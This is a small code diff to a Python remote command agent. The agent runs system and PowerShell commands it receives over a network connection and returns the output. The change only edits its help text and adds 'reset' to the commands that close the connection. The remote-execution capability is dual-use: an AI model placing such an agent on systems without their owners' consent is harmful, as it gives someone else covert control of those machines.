@@ -69,7 +69,7 @@ def windows_command(cmd_in: str) -> str:
                     string += line
             return string
         elif cmd == 'help':
-            commands = ['disconnect,leave,quit,exit','reset','kill','os','cpu','ip (-a for more details)','name','RAM','CPU','IP','ping <destination>','DOS:<system command>','powershell:<powershell command>']
+            commands = ['disconnect,leave,quit,exit','reset','kill','os','cpu','name','RAM','CPU','IP (-a for more details)','ping <destination>','DOS:<system command>','powershell:<powershell command>']
             string = ''
             for i in commands:
                 string += i + '\n'
@@ -94,6 +94,6 @@ def cmd_run(connection, cmd:str) -> None:
     elif sys.platform == "win32":
         data = windows_command(cmd).encode()
     connection.send(data)
-    if cmd == 'disconnect' or cmd == 'kill' or cmd == 'exit' or cmd == 'quit' or cmd == 'leave':
+    if cmd == 'disconnect' or cmd == 'kill' or cmd == 'exit' or cmd == 'quit' or cmd == 'leave' or cmd == 'reset':
         connection.close()
     sys.exit()
